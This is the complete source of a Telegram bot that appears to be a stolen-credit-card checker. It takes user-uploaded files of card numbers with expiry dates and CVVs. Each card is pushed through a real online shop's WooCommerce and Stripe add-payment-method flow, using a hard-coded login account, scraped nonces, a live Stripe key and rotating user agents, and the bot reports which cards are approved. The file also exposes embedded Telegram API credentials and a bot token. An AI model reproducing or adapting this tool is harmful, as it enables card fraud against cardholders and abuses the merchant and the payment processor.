import asyncio
import requests
import random
import string
from telethon import TelegramClient, events, Button
import os

api_id = '26928461'
api_hash = '19dacd8bfa909cb8abd1c0338ca84ad0'
bot_token = '7499167063:AAEsbaP2eBDk3DYq9zzdk1kzfTdPPAMt_kA'

# Chut Started
client = TelegramClient('bot', api_id, api_hash).start(bot_token=bot_token)

user_stop_signals = {}

user_results = {}

user_sessions = {}

authorized_users_file = "authorized_users.txt"
admin_id = '2056396989'

# Auth Logics
def random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/18.18363",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36",
        "Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 11; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.37",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",
    ]
    return random.choice(user_agents)

def random_string(length=12):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

def clear_cookies(session):
    session.cookies.clear()

# BIN lookup
def bin_lookup(bin):
    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin}")
        return response.json()
    except Exception as e:
        return None

def is_authorized(user_id):
    if not os.path.exists(authorized_users_file):
        return False
    with open(authorized_users_file, 'r') as f:
        authorized_users = f.read().splitlines()
    return str(user_id) in authorized_users

def authorize_user(user_id):
    with open(authorized_users_file, 'a') as f:
        f.write(f"{user_id}\n")

def remove_authorization(user_id):
    if not os.path.exists(authorized_users_file):
        return
    with open(authorized_users_file, 'r') as f:
        authorized_users = f.read().splitlines()
    authorized_users = [uid for uid in authorized_users if uid != str(user_id)]
    with open(authorized_users_file, 'w') as f:
        f.write("\n".join(authorized_users) + "\n")

def get_authorized_users():
    if not os.path.exists(authorized_users_file):
        return []
    with open(authorized_users_file, 'r') as f:
        return f.read().splitlines()

def get_user_session(user_id):
    if user_id not in user_sessions:
        user_sessions[user_id] = requests.Session()
    return user_sessions[user_id]

def check_card(card_details, username_tg, session):
    headers = {
        'User-Agent': random_user_agent(),
        'Pragma': 'no-cache',
        'Accept': '*/*',
    }

    cc, mes, ano, cvv = card_details.split('|')
    bin_number = cc[:6]
    
    email = random_string() + "@gmail.com"

    # 10sec wait time
    import time
    time.sleep(10)  # Delay of 10 seconds

    # Get the woocommerce-login-nonce
    response = session.get("https://handtoolessentials.com/my-account/payment-methods/", headers=headers)
    try:
        n_start = response.text.index('woocommerce-login-nonce" value="') + len('woocommerce-login-nonce" value="')
        n_end = response.text.index('"', n_start)
        nonce = response.text[n_start:n_end]
    except ValueError:
        return "Failed to extract login nonce."

    # Step 4: Log in data here
    login_data = {
        'username': 'randenemanual171',
        'password': 'randenemanual171',
        'woocommerce-login-nonce': nonce,
        '_wp_http_referer': '/my-account/add-payment-method',
        'login': 'Log in',
    }
    response = session.post("https://handtoolessentials.com/my-account/payment-methods/", headers=headers, data=login_data)

    # Step 5: Extract add_card_nonce 
    try:
        m_start = response.text.index('add_card_nonce":"') + len('add_card_nonce":"')
        m_end = response.text.index('","', m_start)
        add_card_nonce = response.text[m_start:m_end]
    except ValueError:
        return "Failed to extract add card nonce."

    # Step 6: Create Payment Method on Stripe
    stripe_data = {
        'type': 'card',
        'billing_details[name]': '',
        'billing_details[email]': email,
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_month]': mes,
        'card[exp_year]': ano,
        'guid': random_string(32),
        'muid': random_string(32),
        'sid': random_string(32),
        'payment_user_agent': 'stripe.js/91c61095e7; stripe-js-v3/91c61095e7; split-card-element',
        'referrer': 'https://handtoolessentials.com',
        'time_on_page': '34062',
        'key': 'pk_live_5ZSl1RXFaQ9bCbELMfLZxCsG'
    }
    stripe_response = session.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=stripe_data)
    stripe_json = stripe_response.json()

    if 'id' not in stripe_json:
        return f"Failed to create payment method. Reason: {stripe_json.get('error', {}).get('message', 'Unknown error')}"

    stripe_id = stripe_json['id']

    # Step 7: Confirm the payment method
    confirm_data = {
        'wc-ajax': 'wc_stripe_create_setup_intent',
        'stripe_source_id': stripe_id,
        'nonce': add_card_nonce,
    }
    confirm_response = session.post("https://handtoolessentials.com/?wc-ajax=wc_stripe_create_setup_intent", headers=headers, data=confirm_data)
    confirm_json = confirm_response.json()
# Auth Logics completed.
    if '{"status":"error","error":{"type":"setup_intent_error","message":"Your card could not be set up for future usage."}}' in confirm_response.text:
        site_status = "Your card was declined."
    elif '{"status":"requires_action","client_secret":"' in confirm_response.text:
        bin_data = bin_lookup(bin_number)
        if bin_data:
            country_name = bin_data.get('country_name', 'Unknown')
            country_flag = bin_data.get('country_flag', '')
            bank = bin_data.get('bank', 'Unknown')
            brand = bin_data.get('brand', 'Unknown')
            level = bin_data.get('level', 'Unknown')
            card_type = bin_data.get('type', 'Unknown')

            return (f"**#Stripe_Auth 🌩**\n"
                    f"━━━━━━━━━━━━━\n"
                    f"**[[ϟ](t.me/)] Card:** `{cc}|{mes}|{ano}|{cvv}`\n"
                    f"**[[ϟ](t.me/)] Response: `requires_otp`**\n\n"
                    f"**• Info:** `{brand}-{card_type}-{level}`\n"
                    f"**• Issuer:** `{bank}`\n"
                    f"**• Country:** `{country_name} {country_flag}`\n\n"
                    f"**[[ϟ](t.me/)] Req by** `@{username_tg}` | [PRO]\n"
                    f"**[[ϟ](t.me/)] Proxy: Live ✅**\n"
                    f"━━━━━━━━━━━━━\n"
                    f"`Dev: @ 👑`", "requires_otp")
    else:
        site_status = confirm_response.text.strip()

    status = confirm_json.get('status', 'unknown')
    if status == "success":
        bin_data = bin_lookup(bin_number)
        if bin_data:
            country_name = bin_data.get('country_name', 'Unknown')
            country_flag = bin_data.get('country_flag', '')
            bank = bin_data.get('bank', 'Unknown')
            brand = bin_data.get('brand', 'Unknown')
            level = bin_data.get('level', 'Unknown')
            card_type = bin_data.get('type', 'Unknown')

            return (f"**#Stripe_Auth (15$) 🌩**\n"
                    f"━━━━━━━━━━━━━\n"
                    f"**[[ϟ](t.me/)] Card:** `{cc}|{mes}|{ano}|{cvv}`\n"
                    f"**[[ϟ](t.me/)] Status: Approved! ✅**\n"
                    f"**[[ϟ](t.me/)] Response: `Success`**\n\n"
                    f"**• Info:** `{brand}-{card_type}-{level}`\n"
                    f"**• Issuer:** `{bank}`\n"
                    f"**• Country:** `{country_name} {country_flag}`\n\n"
                    f"**[[ϟ](t.me/)] Req by** `@{username_tg}` | [PRO]\n"
                    f"**[[ϟ](t.me/)] Proxy: Live ✅**\n"
                    f"━━━━━━━━━━━━━\n"
                    f"`Dev: @ 👑`", "Success")
        else:
            return f"Approved - {cc}|{mes}|{ano}|{cvv} (BIN lookup failed)", "Success"
    elif "Your card was declined." in site_status:
        return (f"Declined - {cc}|{mes}|{ano}|{cvv}", "Your card was declined.")
    else:
        return (f"Failed - {cc}|{mes}|{ano}|{cvv}", site_status)

@client.on(events.NewMessage(pattern='/start'))
async def start(event):
    if not is_authorized(event.sender_id):
        await event.respond("🚫 You are not authorized to use this bot.\n- Contact @")
        return
    await event.respond("👋🏻 Hey! Send me a .txt file containing the cards, one per line.\n\nDeveloper: @")

@client.on(events.NewMessage(pattern='/auth'))
async def handle_auth(event):
    if event.sender_id != admin_id:
        await event.respond("Hi")
        return
    
    command = event.raw_text.split()
    if len(command) != 3 or command[1] not in ['add', 'remove']:
        await event.respond("Usage: /auth <add|remove> <user_chat_id>")
        return

    action, user_id = command[1], command[2]
    
    if action == 'add':
        authorize_user(user_id)
        await event.respond(f"✅ User {user_id} has been authorized.")
    elif action == 'remove':
        remove_authorization(user_id)
        await event.respond(f"❌ User {user_id} has been removed from the authorized list.")

@client.on(events.NewMessage(pattern='/authlist'))
async def list_auth(event):
    if event.sender_id != admin_id:
        await event.respond("Hi")
        return
    authorized_users = get_authorized_users()
    await event.respond(f"📝 Authorized users:\n" + "\n".join(authorized_users))

@client.on(events.NewMessage(pattern='/stop'))
async def stop_checking(event):
    if not is_authorized(event.sender_id):
        await event.respond("🚫 You are not authorized to use this bot.")
        return
    
    user_stop_signals[event.sender_id] = True
    await event.respond("🛑 Your card checking process has been stopped.")
    
@client.on(events.NewMessage)
async def handle_file(event):
    if not is_authorized(event.sender_id):
        await event.respond("🚫 You are not authorized to use this bot.")
        return
    if event.file and event.file.name.endswith('.txt'):

        user_stop_signals[event.sender_id] = False

        session = get_user_session(event.sender_id)

        file_path = await event.download_media()

        with open(file_path, 'r') as f:
            cards = f.read().splitlines()

        if len(cards) > 500:
            await event.respond(f"🚫 You can only check up to 500 cards at a time. Your file contains {len(cards)} cards.")
            os.remove(file_path)
            return

        approved = []
        declined = []
        approved_count = 0
        declined_count = 0

        status_message = await event.respond(f"⏳ **Processing** {len(cards)} **cards.**\nPlease wait...")
        username_tg = event.sender.username if event.sender.username else "none"
        for card in cards:
            # Check if the user requested to stop the process
            if user_stop_signals.get(event.sender_id, False):
                await event.respond("🛑 Card checking process stopped as per your request.")
                break
            
            response, site_status = check_card(card, username_tg, session)

            if "Approved" in response:
                approved.append(response)
                approved_count += 1
                await client.send_message(event.chat_id, response, buttons=[
                    [Button.url("🚀", "https://t.me/"), Button.url("SUPPORT ✨", "https://t.me/+HxoWBug3BxIxNzM1")]
                ], link_preview=False)
            else:
                declined.append(response)
                declined_count += 1

            buttons = [
                [Button.inline(f"{card}", b"current_card")],
                [Button.inline(f"{site_status}", b"current_response")],
                [Button.inline(f"✅ 𝐀ᴘᴘʀᴏᴠᴇᴅ {approved_count}", b"show_approved")],
                [Button.inline(f"❌ 𝐃ᴇᴄʟɪɴᴇᴅ {declined_count}", b"show_declined")],
                [Button.inline(f"📊 ꜱᴜᴍᴍᴀʀʏ", b"show_summary")],
                [Button.inline(f"- Dev. @ -", b"show_dev")],
            ]
            await status_message.edit(
                f"📋 Processing:\n- Dev: @",
                buttons=buttons
            )

        user_results[event.chat_id] = {
            'approved': approved,
            'declined': declined,
            'summary': f"**⏳ Total Cards:** `{len(cards)}`\n**✅ Approved:** {approved_count}\n**❌ Dead:** `{declined_count}`\n\n`Dev. @ 👑`"
        }

        if not user_stop_signals.get(event.sender_id, False):
            await event.respond(
                f"✅ All cards checked:\nApproved: {approved_count}\nDeclined: {declined_count}\n\n- Dev: @"
            )

        os.remove(file_path)
        user_stop_signals[event.sender_id] = False

@client.on(events.CallbackQuery)
async def callback(event):
    if not is_authorized(event.sender_id):
        await event.respond("🚫 You are not authorized to use this bot.")
        return
    user_data = user_results.get(event.chat_id, {})

    if event.data == b"show_approved":
        response = "\n".join(user_data.get('approved', []))
        await event.respond(f"Approved Cards:\n{response}")
    elif event.data == b"show_declined":
        response = "\n".join(user_data.get('declined', []))
        await event.respond(f"Declined Cards:\n{response}")
    elif event.data == b"show_summary":
        await event.respond(user_data.get('summary', "No summary available."))
    elif event.data == b"show_dev":
        await event.respond("🚀 t.me/\n\n Join @ for more!") 

print("Bot started!")
client.run_until_disconnected()
